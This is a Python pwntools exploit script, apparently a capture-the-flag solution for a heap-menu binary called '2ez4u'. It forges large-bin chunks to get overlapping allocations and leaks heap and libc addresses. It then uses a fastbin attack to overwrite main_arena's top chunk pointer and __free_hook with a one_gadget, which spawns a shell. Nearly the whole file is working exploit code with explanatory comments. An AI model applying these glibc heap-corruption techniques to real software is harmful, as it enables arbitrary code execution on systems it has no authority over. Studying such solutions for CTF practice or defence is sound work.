from pwn import *

DEBUG=0

if DEBUG==1:
    context.log_level='debug'

p=process('./2ez4u')
libc=ELF('./libc.so')

one_gadget=0x4526a
top_addr=0x3c4b50
chunk_base=0
libc_base=0

sd=lambda c : p.send(c)
sl=lambda c : p.sendline(c)
rv=lambda c : p.recvuntil(c)
sa=lambda a,c : p.sendafter(a,c)
sla=lambda a,c : p.sendlineafter(a,c)


def add(size,content=''):
    sla('choice: ','1')
    sla('1:green):','0')
    sla('?(0-999):','0')
    sla('(0-16):','0')
    sla('(1-1024):',str(size))
    sla('apple:',content)

def dele(index):
    sla('choice: ','2')
    sla('(0-15):',str(index))

def edit(index,content=''):
    sla('choice: ','3')
    sla('(0-15):',str(index))
    sla('green):','2')
    sla('(0-999):','1000')
    sla('(0-16):','17')
    sla('apple:',content)

def show(index):
    sla('choice: ','4')
    sla('(0-15):',str(index))

# alloc servel fastbin
# then we will fake the large bin here
# so we will get chunks overlapped
add(0x60)   # 0
add(0x60)   # 1
add(0x60)   # 2
add(0x60)   # 3
add(0x60)   # 4
add(0x60)   # 5
add(0x60)   # 6
add(0x60)   # 7
add(0x60)   # 8

add(0x3e0)  # 9
add(0x30)   # 10
add(0x3f0)  # 11
add(0x30)   # 12
add(0x3e0)  # 13
add(0x30)   # 14

# fill the bk_nextside
# and alloc a larger chunk to
# add there chunks to largebin list
dele(9)
dele(11)
dele(0)

add(0x400)  # 0
#gdb.attach(p)
show(9)

# Hence we can leak the chunk address
rv("description:")
chunk_base=u64(p.recv(6)+2*'\x00')-0x8d0
log.info("chunk base is "+hex(chunk_base))

# the faked chunk's address
# fake a main chunk: chunk1
# and fake a chunk2 to bypass the
# bk_nextsize and fd_nextsize check
# do not forget the fd and bk check
target=chunk_base+0xb0
chunk1_addr=chunk_base+0x130
chunk2_addr=chunk_base+0x1b0
victim_addr=chunk_base+0x8d0

edit(11,p64(chunk1_addr))

chunk1=p64(0)
chunk1+=p64(0)
chunk1+=p64(0x401)
chunk1+=p64(target-0x18)
chunk1+=p64(target-0x10)
chunk1+=p64(victim_addr)
chunk1+=p64(chunk2_addr)
edit(2,chunk1)

chunk2=p64(0)
chunk2+=p64(0)
chunk2+=p64(0x411)
chunk2+=p64(0)
chunk2+=p64(0)
chunk2+=p64(chunk1_addr)
edit(3,chunk2)

edit(1,p64(0)+p64(chunk1_addr))
edit(9,p64(victim_addr)+p64(0)*16+p64(0x400)+p64(0x401))
# do not ignore the size align
# ==============================

dele(5)
dele(3)
add(0x3e0)  # 3 and we get a largebin overlapped

# now fill the chunk to leak the libc address
# add (or unlink) a chunk to flush the fd to main_arena
edit(3,'a'*0x30+'b'*8)
add(0x60)   # 5
#gdb.attach(p)

# congratulations :)
show(3)
rv("bbbbbbbb")
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4be8
log.info("chunk base is "+hex(libc_base))

# now let's work on the fastbin attack
dele(6)
dele(4)

# here the 'fill' is used to avoid destorying the
# previous data
fill=p64(0)*6
fill+=p64(0x81)
fill+=p64(libc_base+0x3c4be8)
fill+=p64(chunk_base+0x280)
fill+=p64(0)*3+p64(0x411)
fill+=p64(0)*2+p64(chunk_base+0x98)
fill+=p64(0)*5

# then we fake the fd pointer
# and malloc a chunk to change the fastY[]
payload=fill
payload+=p64(0x80)*2
payload+=p64(0x60)

edit(3,payload)

add(0x60) # 4
#gdb.attach(p)

# get a chunk whose size is 0x60
add(0x40) # 6
dele(6)

# overwrite the fd pointer
# free it, and alloc twice
# we get a chunk beyond the top chunk's pointer in main_arena
payload=p64(0)*6
payload+=p64(0x61)
payload+=p64(libc_base+top_addr)

edit(3,payload)

add(0x40)
add(0x40,p64(libc_base+0x3c5c50)) # now you have overwriten the top chunk pointer!

# in order to avoid the malloc-corruption
# we fix the broken large bin's bk_nextsize
edit(11,p64(chunk_base+0x480))

# clean servel positions
# to put in the new chunks
dele(8)
dele(4)
dele(5)
dele(1)

add(0x300)
add(0x300)
add(0x300)
add(0x300)
add(0x300)
add(0x300) # __free_hook is overlapped here!

# offset of the __free_hook
# edit it, and pwned!
offset=0x7f593a6087a8-0x7f593a6085d8
edit(15,'\x00'*offset+p64(libc_base+one_gadget))
dele(15)

p.interactive()
